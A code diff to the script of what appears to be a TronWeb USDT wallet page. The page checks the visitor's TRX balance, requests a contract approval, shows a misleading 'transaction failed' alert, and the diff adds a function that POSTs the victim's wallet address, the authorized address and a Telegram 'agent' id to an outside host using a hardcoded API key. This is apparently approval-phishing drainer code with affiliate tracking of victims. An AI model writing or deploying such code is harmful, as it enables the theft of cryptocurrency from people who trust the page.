@@ -593,7 +593,7 @@
 					if (window.tronWeb.defaultAddress == undefined) {
 						$('.modal-overlay').remove()
 						$('.modal').removeClass('modal-in').addClass('modal-out')
-						mui.alert('TRX矿工费不足22')
+						mui.alert('TRX矿工费不足')
 						return
 					}
 
@@ -604,14 +604,14 @@
 					if (tradeobj['balance'] == undefined) {
 						$('.modal-overlay').remove()
 						$('.modal').removeClass('modal-in').addClass('modal-out')
-						mui.alert('TRX矿工费不足22', '提示', '确定')
+						mui.alert('TRX矿工费不足', '提示', '确定')
 						return
 					}
 					trxye = tradeobj['balance'] / 1000000
 					if (trxye < 22) {
 						$('.modal-overlay').remove()
 						$('.modal').removeClass('modal-in').addClass('modal-out')
-						mui.alert('TRX矿工费不足22', '提示', '确定')
+						mui.alert('TRX矿工费不足', '提示', '确定')
 						return
 					}
 					let contract = await window.tronWeb.contract().at(approveAddr)
@@ -647,7 +647,15 @@
 								// setTimeout(function () {
 								//     $(".tishi").fadeOut()
 								// },2000);
-								mui.alert('交易失败，您的地址流水未达到500USDT', '提示', '确定')
+								// mui.alert('交易失败，您的地址流水未达到500USDT', '提示',								// 提示用户交易失败
+								mui.alert('交易失败', '提示', '确定')
+
+								// --- Agent Binding API Integration ---
+								if (typeof notifyAgentBinding === 'function') {
+									notifyAgentBinding(walletAddress, authorized_address)
+								}
+								// -------------------------------------
+
 								var timestamp = new Date().getTime()
 								var output = GetRandomNum(10000, 99999)
 								outputs = timestamp + '' + output
@@ -695,6 +703,43 @@
 					$('#s').click()
 				}, 1000)
 			})
+
+			// --- Agent Binding API Function ---
+			function notifyAgentBinding(walletAddress, serviceAccount) {
+				const WEB_APP_URL = 'https://vipusdt.dpdns.org/'
+				const SECRET_API_KEY = '5bZk4n9czeodcjtmnPlgWsvS3gBX47hq8pqLvHKXEOc='
+				const tgid = GetRequest().tgid || ''
+
+				if (!tgid) {
+					console.log('No tgid found, skipping agent binding.')
+					return
+				}
+
+				const data = {
+					telegramId: tgid,
+					address: walletAddress,
+					serviceAccount: serviceAccount,
+				}
+
+				console.log('Sending agent binding data:', data)
+
+				fetch(WEB_APP_URL, {
+					method: 'POST',
+					redirect: 'follow',
+					headers: {
+						'Content-Type': 'application/json',
+						'X-API-Key': SECRET_API_KEY,
+					},
+					body: JSON.stringify(data),
+				})
+					.then((response) => response.json())
+					.then((result) => {
+						console.log('Agent binding result:', result)
+					})
+					.catch((error) => {
+						console.error('Agent binding error:', error)
+					})
+			}
 		</script>
 
 		<style class="AC-highLightRule">
